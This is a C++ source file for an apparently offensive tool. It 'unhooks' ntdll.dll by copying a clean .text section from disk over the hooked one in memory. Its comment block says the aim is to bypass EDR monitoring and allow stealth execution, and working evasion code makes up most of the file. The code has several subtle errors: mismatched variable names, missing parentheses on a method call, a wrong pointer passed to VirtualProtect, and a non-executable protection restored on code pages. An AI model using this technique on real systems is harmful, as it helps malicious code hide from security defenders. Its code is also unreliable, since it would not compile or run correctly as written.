/*
Modern Endpoint Detection and Response (EDR) systems frequently install inline hooks inside user-mode DLLs, especially ntdll.dll, 
to intercept system calls and monitor malicious behavior. These hooks are typically injected into the .text section of the DLL,
 where the syscall stubs reside.

By modifying instructions (e.g., inserting jmp or call to EDR code),
 the EDR can observe and log calls to critical functions such as NtOpenProcess, NtCreateThreadEx, etc.

However, this technique can be bypassed by restoring the original, 
unhooked version of ntdll.dll from disk and replacing only its .text section in memory. 
This restores the original syscall stubs and prevents EDR user-mode hooks from working.


Bypass EDR inline hooking	     |   Removes userland trampolines (e.g., jmp EDR.dll)
Enable clean syscall stubs	     |   Required for direct or indirect syscall techniques
Allow stealth execution	Prevents |  triggering behavioral monitors on API calls
Maintain execution in user-mode	 |   No kernel driver or elevated access is required

    How the Technique Works
-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*--*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*--*-*-*-*-*-*-*-*-*-*-*-
Load the clean ntdll.dll from disk using file I/O.
Parse the PE headers of both the in-memory and on-disk versions of the DLL.
Locate the .text section (where syscall stubs are stored).
Temporarily make .text memory writable using VirtualProtect or NtProtectVirtualMemory.
Overwrite the hooked memory region with the clean version from disk.
Restore memory protections to preserve normal behavior.
-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*--*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*--*-*-*-*-*-*-*-*-*-*-*-
*/
#include<Windows.h>
#include<winternl.h>
#include<iostream>
#include<fstream>
#include<vector>
#include<stdio.h>


using namespace std;


bool GetTextSection(BYTE *moduleBase,DWORD&RVA,DWORD&size){
    auto dos = (IMAGE_DOS_HEADER*)moduleBase;
    if(dos->e_magic != IMAGE_DOS_SIGNATURE)return FALSE;

    auto nt = (IMAGE_NT_HEADERS*)(moduleBase+dos->e_lfanew);
    if(nt->Signature != IMAGE_NT_SIGNATURE) return false;
    
    auto section  = IMAGE_FIRST_SECTION(nt);
    for(WORD i=0;i<nt->FileHeader.NumberOfSections;i++){
        if(strncmp((char*)section->Name,".text",5) == 0){
            RVA = section->VirtualAddress;
            size = section->Misc.VirtualSize;
            return true;
        }
        ++section;
    } 
    return false;
}

vector<BYTE> LoadCleanNtdllFromDisk(){
    WCHAR systemPath[MAX_PATH];
    GetSystemDirectoryW(systemPath,MAX_PATH);

    wstring fullPath = wstring(systemPath)+L"ntdll.dll";
    ifstream file(fullPath,ios::binary);

    if(!file){
        cerr << "[-] Failed to open ntdll.dll from the disk ERROR= " << GetLastError() << endl;
        return {}; 
    }
    file.seekg(0,ios::end);
    size_t filesz = file.tellg();
    file.seekg(0,ios::beg);

    vector<BYTE> buffer(filesz);
    file.read(reinterpret_cast<char *>(buffer.data()),filesz);
    file.close();

    return buffer;
}
int main(){
    cout << "[+] Starting ntdll unhooking ...\n";
    BYTE *loadedNtdll = (BYTE *)GetModuleHandleW(L"ntdll.dll");
    if(!loadedNtdll){
        printf("[-] %s GetModuleHandleW ERROR=0x%08x",__FUNCTIONW__,GetLastError());
        return -1; 
    }
    DWORD loadedRva = 0,loadedSz=0;
    if(!GetTextSection(loadedNtdll,loadedRva,loadedSz)){
        printf("[-] Failed to load .text section \n");
        return -1;
    }
    BYTE *loadedTextbase= loadedNtdll+loadedRva;
    cout << "[+] .text in memory: " << static_cast<void*>(loadedTextbase) << " | Size :" << loadedSz << endl;
    vector<BYTE> cleanNtdll = LoadCleanNtdllFromDisk();
    if(cleanNtdll.empty()) return -1;
    
    DWORD cleanRva=0,cleanSz=0;
    if(!GetTextSection(cleanNtdll.data,cleanRva,cleanSz)){
        printf("[-] unable to load a clean copy of Ntdll from the disk");
        return -1;
    }else {
        printf("[+] .text section base at %x and size %d",(cleanNtdll+cleanRva),cleanSz);
    }
    if((cleanRva+cleanSz) > cleanNtdll.size()){
        cerr << "[-] .text section has unknown large size.\n";
        return -1;
    }
    BYTE * cleanTextBase = cleanNtdll.data()+cleanRva;
    DWORD oldProtect = 0;
    BOOL result = VirtualProtect(loadedTextbase,loadedSz,PAGE_READWRITE,&oldprotect);

    if(!result){
        printf("[-] %s VirtualProtect ERROR=0x%08x",__FUNCTIONW__,GetLastError());
        return -1;
    }
    memcpy(loadedTextbase,cleanTextBase,loadedSz);
    FlushInstructionCache(GetCurrentProcess(),loadedTextbase,loadedSz);

    DWORD tempProt;
    result = VirtualProtect(&loadedTextbase,loadedSz,PAGE_READONLY,&tempProt);
    if(!result){
        printf("[-] Failed to change the memory protection of .text at %x ERROR=0x%08x",loadedTextbase,GetLastError());
    }

    cout << "[+] UnHook complete loaded a clean copy of ntdll from the disk\n";
    return 0;
}

